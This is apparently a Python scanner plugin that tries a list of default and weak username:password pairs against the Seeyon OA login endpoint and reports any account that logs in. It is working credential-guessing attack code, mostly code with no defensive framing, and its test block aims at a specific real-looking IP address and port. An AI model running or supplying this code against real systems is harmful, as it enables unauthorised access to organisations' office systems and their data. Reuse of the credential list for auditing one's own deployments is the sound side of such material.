import traceback
import requests

account = [
    "audit-admin:seeyon123456",
    "audit-admin:123456",
    "audit-admin:seeyon@123",
    "system:system",
    "system:1qaz@WSX3edc",
    "system:admin123",
    "group-admin:123456",
    "group-admin:seeyon@123",
    "admin1:123456",
    "admin1:admin123456",
    "admin1:seeyon@123",
    "admin1:admin123",
    "seeyon-guse:123456",
    "service-admin:123456",
    "admin:seeyon@123",
    "admin:123456",
    "admin:admin123",
    "sec-admin:seeyon@123",
    "sec-admin:seeyon123456",
    "sec-admin:123456",
    "system:seeyon@123",
    "test:123456",
    "test1:123456",
]

def _verify(target):
    try:
        vurl = target['target']
        account = target['task_args'].get('account', 'audit-admin:seeyon123456')
        print(account)
        username, password = account.split(":")
        data = {
            'authorization': '',
            'login.timezone': 'GMT%2B8%3A00',
            'login_username': '',
            'login_password': '',
            'login_validatePwdStrength': '2',
            'random': '',
            'fontSize': '12',
            'screenWidth': '1707',
            'screenHeight': '960'
        }
        data['login_username'] = username
        data['login_password'] = password
        response = requests.post(f'{vurl}/seeyon/main.do?method=login', data=data, allow_redirects=False, verify=False, timeout=13)
        location = response.headers.get('Location', '')
        print(f"Response: {response.status_code}, Location: {location}")
        if location and response.status_code == 302:
            if location and 'main.do' in location:
                return
            elif location and '/seeyon/' in location:
                print(f"Successful login: {account}")
                return {'target': vurl, 'result': account}
    except:
        raise RuntimeError(traceback.format_exc())
    
if __name__ == "__main__":
    account = 'audit-admin:seeyon1234562'
    target = {
        'target': 'http://113.16.166.125:12150',
        'task_args': {
            'account': account
        }
    }
    _verify(target)